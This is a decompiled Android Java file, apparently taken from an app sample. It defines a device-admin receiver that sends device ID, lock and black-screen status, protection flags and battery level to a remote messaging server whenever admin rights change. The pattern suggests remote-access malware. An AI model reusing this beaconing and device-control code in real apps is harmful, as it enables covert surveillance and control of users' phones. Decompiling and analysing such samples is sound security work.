package com.mamimobi.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import com.mamimobi.AccessService;
import defpackage.lm0;
import defpackage.o71;
import defpackage.t40;
import io.nats.client.support.ApiConstants;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class DAReceiver extends DeviceAdminReceiver {
    public static float a(Context context) {
        Intent intentRegisterReceiver = context.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        if (intentRegisterReceiver == null) {
            return 50.0f;
        }
        int intExtra = intentRegisterReceiver.getIntExtra(ApiConstants.LEVEL, -1);
        int intExtra2 = intentRegisterReceiver.getIntExtra("scale", -1);
        if (intExtra == -1 || intExtra2 == -1) {
            return 50.0f;
        }
        return (intExtra / intExtra2) * 100.0f;
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        o71 o71VarF = o71.f(context);
        lm0 lm0Var = o71VarF.e;
        String strV = t40.V(context);
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(ApiConstants.ID, strV);
            jSONObject.put(ApiConstants.ACTION, "deviceAdminDisabled");
            jSONObject.put("locked", AccessService.F0.get());
            jSONObject.put("isBlackScreen", AccessService.J0.get());
            jSONObject.put("isProtected", AccessService.M0.get());
            jSONObject.put("batteryLevel", a(context));
            t40.e0(context, jSONObject);
            if (o71VarF.e() != null) {
                jSONObject.put("clientid", o71VarF.e());
            }
            lm0Var.c(jSONObject.toString().getBytes());
        } catch (Exception unused) {
        }
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        AccessService.s();
        o71 o71VarF = o71.f(context);
        lm0 lm0Var = o71VarF.e;
        String strV = t40.V(context);
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(ApiConstants.ID, strV);
            jSONObject.put(ApiConstants.ACTION, "deviceAdminEnable");
            jSONObject.put("locked", AccessService.F0.get());
            jSONObject.put("isBlackScreen", AccessService.J0.get());
            jSONObject.put("isProtected", AccessService.M0.get());
            jSONObject.put("batteryLevel", a(context));
            t40.e0(context, jSONObject);
            if (o71VarF.e() != null) {
                jSONObject.put("clientid", o71VarF.e());
            }
            lm0Var.c(jSONObject.toString().getBytes());
        } catch (Exception unused) {
        }
    }
}
